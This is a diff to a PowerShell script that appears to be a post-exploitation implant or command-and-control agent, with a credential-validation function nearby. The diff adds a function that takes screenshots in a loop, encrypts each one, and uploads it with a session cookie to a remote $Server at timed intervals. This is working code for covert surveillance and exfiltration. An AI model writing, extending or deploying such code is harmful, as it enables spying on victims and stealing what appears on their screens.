@@ -218,6 +218,19 @@ Function Test-ADCredential
 	$object.IsValid = $pc.ValidateCredentials($username, $password).ToString();
 	return $object
 }
+Function Get-ScreenshotMulti {
+    param($Timedelay, $Quantity)
+
+    if ($Quantity -and $Timedelay) {
+        ForEach ($number in 1..[int]$Quantity ) { 
+            $Output = Get-Screenshot         
+            $Output = Encrypt-String2 $key $Output
+            $UploadBytes = getimgdata $Output
+            (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
+            Start-Sleep $Timedelay
+        }
+    }
+}
 Function Get-Screenshot 
 {
     param($File)
